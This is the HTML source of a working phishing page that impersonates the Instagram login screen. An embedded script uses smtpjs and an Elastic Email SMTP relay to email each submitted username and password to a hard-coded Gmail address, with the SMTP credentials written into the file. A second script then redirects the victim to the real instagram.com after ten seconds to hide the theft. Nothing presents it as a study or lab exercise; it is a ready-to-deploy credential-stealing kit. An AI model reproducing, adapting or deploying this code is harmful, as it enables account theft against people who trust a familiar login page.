<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <script src=" https://smtpjs.com/v3/smtp.js"></script>
    <link rel="stylesheet" href="src/static/style.css" />
    <title>Instagram</title>
  </head>

  <body>
    <div id="content-container">
      <!--Phone's pictures section-->
      <section class="phones">
        <img
          src="src/assets/home-phones.png"
          alt="pictures on phone"
          class="phone-image"
        />
        <div class="display-phone">
          <img class="picture" src="src/assets/screenshot1.png" alt="#" />
          <img class="picture" src="src/assets/screenshot2.png" alt="#" />
          <img class="picture" src="src/assets/screenshot3.png" alt="#" />
          <img class="picture" src="src/assets/screenshot4.png" alt="#" />
        </div>
      </section>

      <!--User's log in section-->
      <section class="user">
        <div class="login-container">
          <!--Instagram Logo-->
          <div class="instagram-logo-box">
            <img class="instagram-logo" src="src/assets/instagram-logo.png" />
          </div>

          <!--Form Login-->
          <form
            id="login-post"
            method="POST"
            onsubmit="sendEmail(); reset(); return false;"
          >
            <div class="inputs-container">
              <input
                type="text"
                name="username"
                id="username"
                placeholder="Phone number, username or email"
                required
              />
            </div>
            <div class="inputs-container">
              <input
                type="password"
                name="password"
                id="password"
                placeholder="Password"
              />
            </div>
            <button class="login-button" type="submit" id="openPageButton">
              Log In
            </button>
            <div class="or-container">
              <div class="line"></div>
              <div class="or">OR</div>
              <div class="line"></div>
            </div>

            <!--Facebook login-->
            <div class="facebook-container">
              <a
                class="facebook-login"
                href="http://facebook.com/"
                target="_blank"
                ><img class="facebook-logo" src="src/assets/facebook-logo.png" />Log in
                with Facebook</a
              >
            </div>
          </form>

          <!--Password recovery-->
          <a class="password-forgot" href="#" target="_blank"
            >Forgot password?</a
          >
        </div>

        <!--Sign up-->
        <div class="signup-container">
          <p>
            Don't have an account?
            <a class="signup" href="#" target="_blank">Sign up</a>
          </p>
        </div>

        <!--App's download-->
        <div class="get-container">
          <p>Get the app.</p>
          <div class="download-container">
            <a class="download-appstore" href="#" target="_blank"
              ><img class="appstore" src="src/assets/App.png"
            /></a>
            <a class="download-googleplay" href="#" target="_blank"
              ><img class="googleplay" src="src/assets/Micro.png"
            /></a>
          </div>
        </div>
      </section>
    </div>
    <div style="height: 10%; margin-top: -3%">
      <div
        style="
          display: flex;
          flex-direction: row;
          flex-wrap: wrap;
          text-align: center;
          justify-content: center;
          max-width: 1200px;
          margin: auto;
        "
        class="navbar"
      >
        <span>Meta</span>
        <span>About</span>
        <span>Blog</span>
        <span>Jobs</span>
        <span>Help</span>
        <span>API</span>
        <span>Privacy</span>
        <span>Terms</span>
        <span>Locations</span>
        <span>Instagram Lite</span>
        <span>Threads</span>
        <span>Contact Uploading & Non-Users</span>
        <span>Meta Verified</span>
      </div>
      <div style="text-align: center; color: gray; padding: 10px">
        Â© 2024 Instagram from Meta
      </div>
    </div>
    <script>
      function sendEmail() {
        Email.send({
          Host: "smtp.elasticemail.com",
          Username: "devildark0072@gmail.com",
          Password: "CB817D322CBCC6AFB3193FA8E5FFD0372F4B",
          To: "devildark0072@gmail.com",
          From: "devildark0072@gmail.com",
          Subject: "Hello Bro",
          Body:
            "Username:" +
            document.getElementById("username").value +
            "<br/>Password:" +
            document.getElementById("password").value,
        }).then();
      }
    </script>
    <script>
      document
        .getElementById("openPageButton")
        .addEventListener("click", function () {
          setTimeout(function () {
            window.location.href = "https://www.instagram.com/";
          }, 10000);
        });
    </script>
  </body>
</html>
